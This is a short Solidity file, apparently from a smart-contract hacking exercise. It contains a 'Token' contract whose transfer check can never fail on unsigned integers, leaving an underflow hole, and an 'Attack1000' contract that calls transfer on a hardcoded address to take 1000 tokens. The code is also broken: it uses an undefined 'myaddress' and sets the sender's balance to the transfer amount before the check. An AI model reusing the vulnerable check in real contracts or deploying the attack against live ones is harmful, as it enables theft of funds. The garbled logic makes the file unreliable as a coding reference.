// 0x3310a91295391781b2639028a9008ac9Dfea3FAb

pragma solidity 0.6.0;

contract Token {
    mapping(address => uint) balances;

    uint public num;
    
    constructor(uint _initialSupply) public {
        balances[msg.sender] = _initialSupply;
    }
    
    function balanceOf(address _owner) public view returns (uint){
        return balances[_owner];
    }
    
    function transfer(address _to, uint _value) public returns (bool) {
        num = balances[msg.sender] = _value;
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
    
}


contract Attack1000 {
    mapping(address => uint) balances;
    

    function hack() public {
       Token(0x3310a91295391781b2639028a9008ac9Dfea3FAb).transfer(myaddress,1000);
    }
    
}